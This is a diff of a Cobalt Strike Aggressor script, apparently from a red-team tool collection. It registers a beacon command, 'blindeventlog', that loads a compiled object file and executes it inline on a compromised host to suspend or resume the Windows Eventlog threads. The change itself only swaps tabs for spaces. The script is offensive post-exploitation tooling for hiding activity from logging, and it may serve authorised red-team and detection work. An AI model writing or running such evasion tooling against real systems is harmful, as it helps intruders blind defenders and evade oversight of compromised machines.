@@ -1,31 +1,31 @@
 # author REDMED-X
 
 beacon_command_register(
-	"blindeventlog", "Blind Eventlog by suspending its threads.\n",
-	"INFO:\nBlind Eventlog by suspending its threads. This technique requires elevated privileges.\nBe aware that all events, from the period the threads were suspended, will be pushed to Eventlog the moment the threads are resumed.\n\nOPTIONS:\n[suspend]: find and suspend all Eventlog threads and disrupt its functionality\n[resume]: find and resume all Eventlog threads and restore its functionality\n\n" .
-	"USAGE:\nblindeventlog <suspend | resume>\n\n");
+    "blindeventlog", "Blind Eventlog by suspending its threads.\n",
+    "INFO:\nBlind Eventlog by suspending its threads. This technique requires elevated privileges.\nBe aware that all events, from the period the threads were suspended, will be pushed to Eventlog the moment the threads are resumed.\n\nOPTIONS:\n[suspend]: find and suspend all Eventlog threads and disrupt its functionality\n[resume]: find and resume all Eventlog threads and restore its functionality\n\n" .
+    "USAGE:\nblindeventlog <suspend | resume>\n\n");
 
 
 alias blindeventlog {
     $bid = $1;
     $action = $2;
 
-	if ($action eq "suspend" || $action eq "resume") {
-	}
-	else {
-		berror($bid, "Please specify one of the following actions: suspend | resume\n");
-		return;
-	}
+    if ($action eq "suspend" || $action eq "resume") {
+    }
+    else {
+        berror($bid, "Please specify one of the following actions: suspend | resume\n");
+        return;
+    }
 	
     # Read in the right BOF file
     $handle = openf(script_resource("blindeventlog.o"));
     $data   = readb($handle, -1);
     closef($handle);
 
-	# Pack our arguments
+    # Pack our arguments
     $arg_data  = bof_pack($bid, "z", $action);
 
-	blog($bid, "Tasked to interact with Eventlog..");
+    blog($bid, "Tasked to interact with Eventlog..");
     beacon_inline_execute($bid, $data, "go", $arg_data);
 }
 
